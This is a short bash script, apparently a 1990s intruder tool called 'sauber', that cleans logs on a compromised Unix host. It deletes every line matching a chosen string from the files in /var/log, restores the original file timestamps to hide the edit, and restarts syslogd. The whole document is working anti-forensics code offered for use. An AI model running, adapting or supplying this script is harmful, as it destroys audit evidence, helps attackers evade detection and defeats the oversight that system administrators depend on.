#!/bin/bash
#
# sauber - by socked [11.02.99]
#
# Usage: sauber <string>

BLK='[1;30m'
RED='[1;31m'
GRN='[1;32m'
YEL='[1;33m'
BLU='[1;34m'
MAG='[1;35m'
CYN='[1;36m'
WHI='[1;37m'
DRED='[0;31m'
DGRN='[0;32m'
DYEL='[0;33m'
DBLU='[0;34m'
DMAG='[0;35m'
DCYN='[0;36m'
DWHI='[0;37m'
RES='[0m'

echo "${BLK}* ${WHI}sauber ${DWHI}by ${WHI}s${BLU}o${DBLU}ck${BLK}ed [${DWHI}07${BLK}.${DWHI}27${BLK}.${DWHI}97${BLK}]${RES}"
if [ $# != 1 ]
then
  echo "${BLK}* ${DWHI}Usage${WHI}: "$0" <${DWHI}string${WHI}>${RES}"
  echo " "
  exit
fi
echo "${BLK}*${RES}"
echo "${BLK}* ${DWHI}Cleaning logs...${RES}"

WERD=$(/bin/ls -F /var/log | grep -v "/" | grep -v "*" | grep -v ".tgz" | grep -v ".gz" | grep -v ".tar" | grep -v "lastlog" | grep -v "utmp" | grep -v "wtmp" | grep -v "@")

for fil in $WERD
do
   line=$(wc -l /var/log/$fil | awk -F ' ' '{print $1}')
   echo -n "${BLK}* ${DWHI}Cleaning ${WHI}$fil ($line ${DWHI}lines${WHI})${BLK}...${RES}"
   grep -v $1 /var/log/$fil > new
   touch -r /var/log/$fil new
   mv -f new /var/log/$fil
   newline=$(wc -l /var/log/$fil | awk -F ' ' '{print $1}')
   let linedel=$(($line-$newline))
   echo "${WHI}$linedel ${DWHI}lines removed!${RES}"

done

killall -HUP syslogd
echo "${BLK}* ${DWHI}Done.${RES}"
